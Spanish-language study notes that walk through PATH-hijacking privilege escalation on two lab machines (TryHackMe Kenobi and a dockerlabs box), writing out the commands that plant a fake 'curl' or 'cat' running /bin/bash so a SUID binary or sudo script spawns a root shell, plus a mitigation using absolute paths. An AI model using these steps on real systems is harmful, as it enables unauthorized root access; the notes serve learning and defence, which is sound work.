- Tags: #escalada_privilegios #escalada #recursos_tryhackme

**Recurso**: Maquina Try HackMe Kenobi

Lo que haremos en en la variable path agregar un binario que se ejecute antes que los binarios originales del sistema , en esta maquina hay un binario que se ejecuta con permisos de root y a su vez ejecuta el comando curl .Pes lo que haremos es crearnos nuesro propio binario curl que ejecute una bash y como el binario que llama a curl tiene permisos de SUID este nos otorgara un bash con privilegios de root

```bash
echo /bin/bash > curl
chmod 777 curl
export PATH=.:$PATH  #Aqui le decimos que ponga en el path lo que tenemos en el directorio actual que en este caso es nuestro curl , por lo que cuando el otro binario vaya a ejecutar curl pues ejecutara nuestro binario que contiene el acceso a la bash y como el que lo ejecuta tiene permisos de root se ejecuta con estos privilegios
```

Para evitar o mitigar esto cuando queremos que root ejecute algún binario es necesario que se ejecute con la ruta absoluta para que no exista confusion al momento de ejecutar un comando buscándolo en el path

Otro ejemplo 
**Maquina** : Galeria dockerlabs.es

En este caso un vulnerabilidad que se puede ver es que env_keep += PATH esto lo que hace es que cuando se utilice el comando sudo la variable path no se va a restablecer por lo que si ejecutamos un script que ejecute un comando mediante una ruta relativa podremos exporta el comando a la ruta de nuestro user

Qué pasa si haces

`env_keep += PATH`

👉 sudo usará el PATH del usuario  
👉 Esto puede ser MUY peligroso

# ⭐ Cómo funciona el ataque

Supongamos que el administrador permite:

`usuario ALL=(root) /usr/bin/script.sh`

Y ese script ejecuta:

`cat archivo.txt`

Sin ruta completa.

## Ahora el atacante:

1️⃣ Crea un binario falso llamado `cat`

`nano cat`

Contenido:

`#!/bin/bash /bin/bash`

---

2️⃣ Da permisos

`chmod +x cat`

---

3️⃣ Modifica PATH

`export PATH=/home/usuario:$PATH`

---

4️⃣ Ejecuta sudo

Si sudo conserva PATH:

`sudo script.sh`

👉 El script ejecutará el cat falso  
👉 Obtiene shell root

# ✅ Agregar al FINAL del PATH (lo más común y seguro)

`export PATH=$PATH:/nuevo/directorio`

# ✅ Agregar al PRINCIPIO del PATH

`export PATH=/nuevo/directorio:$PATH`